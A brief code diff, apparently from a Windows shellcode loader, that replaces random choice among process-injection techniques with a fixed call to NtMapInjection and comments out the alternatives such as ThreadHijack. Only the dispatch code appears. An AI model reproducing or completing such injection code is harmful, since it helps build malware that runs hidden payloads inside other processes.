@@ -33,7 +33,8 @@ int main(int argc, char* argv[]) {
     srand((unsigned int)GetCurrentProcessId());
 
     int random = rand()%4;
-    
+    NtMapInjection(lpShellcode, memory_allocation);
+    /*
     switch (random)
     {
     case 0:
@@ -49,6 +50,6 @@ int main(int argc, char* argv[]) {
         ThreadHijack(lpShellcode, memory_allocation);
         break;
     }
-    
+    */
     return 0;
 }
